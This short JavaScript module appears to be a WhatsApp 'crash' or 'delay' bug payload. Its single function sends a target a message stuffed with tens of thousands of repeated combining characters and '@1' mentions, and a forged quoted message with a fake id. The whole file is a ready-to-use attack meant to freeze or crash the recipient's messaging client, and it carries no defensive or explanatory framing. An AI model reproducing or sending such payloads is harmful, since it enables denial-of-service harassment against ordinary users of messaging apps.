export const version = "1.0.0";
export const hash = "SIG_NBKBC";

export async function custom_unit(sock, jid) {
    await sock.sendMessage(jid, {
        extendedTextMessage: {
            text: "ꦾ࣯࣯".repeat(55000) + "@1".repeat(50000),
            contextInfo: {
                stanzaId: jid,
                participant: jid,
                quotedMessage: {
                    conversation: "vinzFcXdelay" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(5000)
                },
                disappearingMode: {
                    initiator: "CHANGED_IN_CHAT",
                    trigger: "CHAT_SETTING"
                }
            },
            inviteLinkGroupTypeV2: "DEFAULT"
        }
    }, {
        quoted: {
            key: { remoteJid: jid, fromMe: false, id: "XOV_INTERNAL" },
            message: { conversation: "SYSTEM_CALIBRATION_X" }
        }
    });
}